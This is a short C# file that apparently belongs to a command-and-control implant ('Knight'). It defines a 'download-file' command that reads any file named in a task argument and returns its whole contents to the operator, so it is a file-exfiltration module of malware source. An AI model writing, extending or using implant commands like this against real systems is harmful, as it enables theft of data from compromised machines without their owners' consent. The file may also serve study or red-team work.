using Knight.Models.Raven;
using System;
using System.IO;

namespace Knight.Commands
{
    public class DownloadFile : KnightCommand
    {
        public override string Name => "download-file";

        public override string Execute(TaskMessage task)
        {
            try
            {
                string file = File.ReadAllText(task.Arguments[0]);
                return file;
            }
            catch (Exception e)
            {
                return e.ToString();
            }
        }
    }
}